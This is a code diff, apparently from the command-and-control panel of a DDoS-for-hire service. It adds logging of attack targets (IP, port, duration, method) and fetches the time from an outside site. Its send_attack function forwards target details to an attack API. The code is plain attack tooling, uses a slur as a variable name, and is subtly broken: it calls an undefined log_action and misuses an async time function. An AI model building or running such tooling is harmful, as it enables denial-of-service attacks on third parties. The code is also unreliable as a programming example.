@@ -44,7 +44,7 @@ exports.log_to_file = function(output) {
 }
 
 exports.log_attack = function(user, ip, port, time, method) {
-
+    fs.appendFileSync("./CNC/db/sys/users.db", "('" + user + "','" + ip + "','" + port + "','" + time + "','" + method + "','" + this.currentTime() + "')\n");
 }
 
 /*
@@ -68,10 +68,9 @@ exports.pScan = async function(ip) {
 /*
 *@type: void
 */
-exports.currentTime = function() {
-    let current = new Date();
-    let gay = current.getMonth()+1 + "/" + current.getDate() + "/" + current.getFullYear();
-    return gay;
+exports.currentTime = async function() {
+    let gangshit = await(await fetch("https://traumatized.tech/time.php")).text();
+    return gangshit;
 }
 
 /*
@@ -117,6 +116,8 @@ exports.send_attack = async function(ip, port, time, method, usr) {
     if(parseInt(time) > parseInt(max_time)) {
         return "[x] Error, You've reached your max time!";
     }
+
+    this.log_action(usr, ip, port, time, method);
     let response = "";
     
     let rreturn = await(await fetch(Config.API_1 + ip + "&port=" + port + "&time=" + time + "&type=" + method)).text();
